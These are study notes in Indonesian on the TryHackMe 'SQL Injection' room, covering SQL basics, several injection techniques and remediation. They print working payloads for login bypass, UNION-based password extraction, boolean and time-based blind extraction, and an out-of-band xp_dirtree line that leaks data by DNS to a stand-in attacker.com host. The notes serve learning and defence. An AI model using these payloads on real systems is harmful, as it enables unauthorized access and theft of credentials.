# TryHackMe: SQL Injection


---

- **Room Link:** [SQL Injection](https://tryhackme.com/room/sqlinjectionlm)
- **Category:** Web Security
- **Difficulty:** Medium

---

## Task 1: Brief

**SQL Injection (SQLi)** itu kerentanan keamanan web yang bikin penyerang bisa manipulasi query yang dibuat aplikasi ke database-nya. Ini bikin penyerang bisa liat data yang biasanya gak bisa mereka ambil, kayak data milik pengguna lain, atau data apa pun yang bisa diakses sama aplikasi itu sendiri. Dalam banyak kasus, penyerang bisa modifikasi atau hapus data ini, nyebabin perubahan permanen di konten atau aplikasi.

---

## Task 2: What is a Database?

**Database** itu kumpulan data yang terstruktur.
*   **DBMS (Database Management System):** Software yang dipake buat ngelola database (misal MySQL, PostgreSQL, Microsoft SQL Server).
*   **Relational Database (RDBMS):** Nyimpen data dalam tabel pake baris dan kolom. Pake SQL.
    *   Contoh: MySQL, PostgreSQL, MSSQL, SQLite.
*   **Non-Relational Database (NoSQL):** Nyimpen data dalam format lain (dokumen, key-value pair).
    *   Contoh: MongoDB, Redis.

---

## Task 3: What is SQL?

**SQL (Structured Query Language)** itu bahasa standar buat berinteraksi sama Relational Database.

**Perintah Dasar:**
1.  **SELECT:** Ngambil data.
    ```sql
    SELECT * FROM users WHERE username = 'admin';
    ```
2.  **INSERT:** Nambahin data baru.
    ```sql
    INSERT INTO users (username, password) VALUES ('dimm', '12345');
    ```
3.  **UPDATE:** Ngubah data yang udah ada.
    ```sql
    UPDATE users SET password = 'newpass' WHERE username = 'dimm';
    ```
4.  **DELETE:** Hapus data.
    ```sql
    DELETE FROM users WHERE username = 'dimm';
    ```

---

## Task 4: What is SQL Injection?

SQL Injection terjadi waktu input pengguna yang gak dipercaya digabungin secara dinamis langsung ke dalam query database tanpa sanitasi yang bener.

**Contoh Kerentanan:**
```php
$username = $_POST['username'];
$query = "SELECT * FROM users WHERE username = '" . $username . "'";
```
Kalau inputnya `' OR 1=1 --`:
```sql
SELECT * FROM users WHERE username = '' OR 1=1 --'
```
*   `'`: Nutup field data.
*   `OR 1=1`: Kondisi yang Selalu Benar (Always True).
*   `--`: Nge-comment (matiin) sisa query.

---

## Task 5: In-Band SQLi

**In-Band SQLi** itu waktu penyerang pake saluran komunikasi yang sama buat nge-launch serangan dan ngumpulin hasilnya.

1.  **Error-Based SQLi:**
    *   Ngandelin pesan error yang dikeluarin server database buat dapetin informasi tentang struktur database.
    *   Contoh: Nambahin `'` nyebabin syntax error, yang bisa nge-reveal tipe DB di backend.

2.  **Union-Based SQLi:**
    *   Pake operator `UNION` buat gabungin hasil dari dua atau lebih statement SELECT jadi satu hasil.
    *   **Syarat:** Jumlah kolom harus sama dan tipe datanya kompatibel.
    *   Contoh: `' UNION SELECT username, password FROM users --`

---

## Task 6: Blind SQLi - Authentication Bypass

**Blind SQLi:** Aplikasi gak nge-return hasil query SQL secara langsung.
**Authentication Bypass:**
*   Nargetin formulir login buat masuk tanpa password.
*   Payload: `' OR 1=1 --` atau `admin' --` atau `' OR 1=1 LIMIT 1 --`
*   Tujuan: Bikin query ngembaliin setidaknya satu baris (user admin) jadi aplikasi ngira login berhasil.

---

## Task 7: Blind SQLi - Boolean Based

**Konsep:**
*   Aplikasi ngasih respons yang beda (konten halaman, kode status HTTP) tergantung apakah query bernilai TRUE atau FALSE.
*   Kita bisa ngajuin pertanyaan Ya/Tidak ke database buat ekstrak data karakter per karakter.

**Contoh:**
Cek apakah username itu 'admin':
```sql
admin' AND 1=1 -- (True - Halaman load normal)
admin' AND 1=0 -- (False - Halaman ilang konten/404)
```
Cek huruf pertama password:
```sql
admin' AND SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1) = 'a' --
```

---

## Task 8: Blind SQLi - Time Based

**Konsep:**
*   Dipake waktu aplikasi GAK ngasih perbedaan respons yang keliatan (gak ada error, gak ada perubahan konten).
*   Kita nyuntikin perintah **Time Delay** (tidur). Kalau query dieksekusi berhasil (TRUE), server bakal nunggu selama X detik.

**Payloads:**
*   **MySQL:** `SLEEP(5)`
*   **PostgreSQL:** `pg_sleep(5)`
*   **MSSQL:** `WAITFOR DELAY '0:0:5'`

**Contoh:**
Kalau versi database diawali angka '5', tidur selama 5 detik:
```sql
' AND IF(SUBSTRING(VERSION(),1,1)='5', SLEEP(5), 0) --
```

---

## Task 9: Out-of-Band SQLi

**Konsep:**
*   Dipake waktu teknik In-Band dan Blind gak memungkinkan (misal, pemrosesan asinkron).
*   Ngandelin kemampuan server database buat bikin request DNS atau HTTP buat ngirim data ke server yang dikontrol penyerang.

**Contoh (MSSQL pake `xp_dirtree`):**
Minta file dari server penyerang, bocorin data di subdomain:
```sql
'; exec master..xp_dirtree '\\admin-password.attacker.com\foo' --
```
*   Penyerang mantau log DNS buat `admin-password.attacker.com`.

---

## Task 10: Remediation

**Cara Ngatasin:**

1.  **Prepared Statements (Parameterized Queries):**
    *   Database memperlakukan input pengguna sebagai data, bukan kode yang bisa dieksekusi.
    *   **PHP (PDO):**
        ```php
        $stmt = $pdo->prepare('SELECT * FROM users WHERE email = :email');
        $stmt->execute(['email' => $email]);
        ```

2.  **Input Validation:**
    *   Deny-list (Blok karakter berbahaya kayak `'`, `--`) - **Lemah**.
    *   Allow-list (Cuma izinin karakter tertentu, misal: alfanumerik) - **Kuat**.
